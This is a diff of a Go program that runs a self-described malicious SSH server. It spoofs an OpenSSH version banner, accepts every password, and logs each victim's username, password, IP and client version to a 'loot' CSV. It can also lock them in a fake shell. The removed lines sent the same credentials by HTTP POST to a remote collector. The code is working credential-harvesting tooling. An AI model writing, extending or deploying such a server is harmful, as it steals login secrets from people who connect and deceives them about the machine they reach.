@@ -1,90 +1,99 @@
 package main
 
 import (
-	"bytes"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
-    "github.com/gorilla/mux"
+	"strings"
+
 	"github.com/gliderlabs/ssh"
+	gossh "golang.org/x/crypto/ssh"
+	"golang.org/x/crypto/ssh/terminal"
 )
 
-var rhost string
+type loginData struct {
+	username      string
+	password      string
+	remoteIP      string
+	remoteVersion string
+}
 
 func main() {
-	var isListener bool
 	var lport uint
-	flag.BoolVar(&isListener, "l", false, "Set this option if you want this instance to be the HTTP listener")
-	flag.UintVar(&lport, "p", 8000, "Set the local port to listen for SSH or HTTP on")
-	flag.StringVar(&rhost, "r", "http://localhost:8000", "The full URI path to POST creds to")
+	var lhost string
+	var keyPath string
+	var fakeShell bool
+	flag.UintVar(&lport, "p", 2222, "Set the local port to listen for SSH on")
+	flag.StringVar(&lhost, "i", "0.0.0.0", "The IP address to listen on")
+	flag.StringVar(&keyPath, "k", "id_rsa", "Set a path to the private key to use for the SSH server")
+	flag.BoolVar(&fakeShell, "shell", false, "Set true to lock the user in a fake shell")
 	flag.Parse()
-	if isListener {
-		log.SetPrefix("HTTP - ")
-        log.Println("Started HTTP server")
-        mr := mux.NewRouter()
-        mr.HandleFunc("/csv/",csvHTTPHandler)
-        mr.HandleFunc("/plain/", httpHandler)
-		log.Fatal(http.ListenAndServe(fmt.Sprintf(":%v", lport), mr))
-	} else {
-		log.SetPrefix("SSH - ")
-		log.Println("Started malicious SSH server")
-		server := &ssh.Server{
-			Addr:            fmt.Sprintf(":%v", lport),
-			Handler:         sshHandler,
-			Version:         "OpenSSH",
-			PasswordHandler: passwordHandler,
-		}
-		log.Fatal(server.ListenAndServe())
+	log.SetPrefix("SSH - ")
+	privKeyBytes, err := ioutil.ReadFile(keyPath)
+	if err != nil {
+		log.Panicln("Error reading privbkey:\t", err.Error())
 	}
+	privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
+	if err != nil {
+		log.Panicln("Error parsing pubkey:\t", err.Error())
+	}
+	server := &ssh.Server{
+		Addr: fmt.Sprintf("%s:%v", lhost, lport),
+		Handler: func() ssh.Handler {
+			if !fakeShell {
+				return sshHandler
+			}
+			return fakeTerminal
+		}(),
+		Version:         "OpenSSH_8.2p1 Debian-4",
+		PasswordHandler: passwordHandler,
+	}
+	server.AddHostKey(privateKey)
+	log.Println("Started malicious SSH server")
+	log.Fatal(server.ListenAndServe())
 }
 
-func httpHandler(w http.ResponseWriter, r *http.Request) {
-	w.WriteHeader(200)
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		log.Println(err.Error())
-	}
-	log.Println(string(body))
-}
-func csvHTTPHandler(w http.ResponseWriter, r *http.Request) {
-	w.WriteHeader(200)
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		log.Println(err.Error())
-    }
-    log.Println(string(body))
-	file, err := os.OpenFile("/home/james/loot.csv", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+func logData(data loginData) {
+	file, err := os.OpenFile("loot.csv", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Println(err.Error())
 	}
 	defer file.Close()
-	if _, err := file.WriteString(string(body)); err != nil {
+	loginString := fmt.Sprintf("%s,%s,%s,%s\n", data.username, data.password, data.remoteIP, data.remoteVersion)
+	if _, err := file.WriteString(loginString); err != nil {
 		log.Println(err.Error())
 	}
-
 }
-func sshHandler(s ssh.Session) {
+
+func sshHandler(s ssh.Session) { //TODO improve this
 	s.Write([]byte("Don't blindly SSH into every VM you see.\n"))
 }
-
+func fakeTerminal(s ssh.Session) {
+	term := terminal.NewTerminal(s, fmt.Sprintf("%s@kali:~$ ", s.User()))
+	for {
+		commandLine, _ := term.ReadLine()
+		commandLineSlice := strings.Split(commandLine, " ")
+		if commandLineSlice[0] == "exit" {
+			break
+		}
+		if commandLineSlice[0] != "" {
+			term.Write([]byte(fmt.Sprintf("bash: %s: command not found\n", commandLineSlice[0])))
+		}
+	}
+}
 func passwordHandler(context ssh.Context, password string) bool {
 	details := fmt.Sprintf(
 		"Got Login!\nUsername:\t%s\nPassword:\t%s\nRemote:\t%s\nClient:\t%s\n",
 		context.User(), password, context.RemoteAddr(), context.ClientVersion())
-    resp1, err := http.Post(rhost+"plain/", "text/plain", bytes.NewBufferString(details))
-    if err != nil {
-        log.Println(err.Error())
-    }
-    csvDetails := fmt.Sprintf("%s,%s,%s,%s\n",context.User(), password, context.RemoteAddr(), context.ClientVersion())
-    log.Println(csvDetails)
-    resp2, err := http.Post(rhost+"csv/", "text/csv", bytes.NewBufferString(csvDetails))
-    if err != nil {
-        log.Println(err.Error())
-    }
-    log.Println(resp1.Status,"plain POST")
-    log.Println(resp2.Status,"CSV POST")
+	log.Println(details)
+	data := loginData{
+		username:      context.User(),
+		password:      password,
+		remoteIP:      context.RemoteAddr().String(),
+		remoteVersion: context.ClientVersion()}
+	//log.Println(data)
+	logData(data)
 	return true
 }
